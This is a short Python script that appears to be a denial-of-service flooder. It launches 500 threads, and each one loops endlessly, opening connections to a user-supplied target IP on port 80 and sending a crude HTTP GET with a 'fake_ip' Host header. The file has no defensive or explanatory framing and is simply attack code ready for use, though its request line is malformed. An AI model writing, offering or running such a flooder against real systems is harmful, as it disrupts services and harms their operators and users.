import threading
import socket

target = '' #target ip address
port = 80 #specify port 
fake_ip = ''

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'),(target, port))
        s.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()


for i in range(500):
    thread = threading.Thread(target=attack) 
    thread.start()       
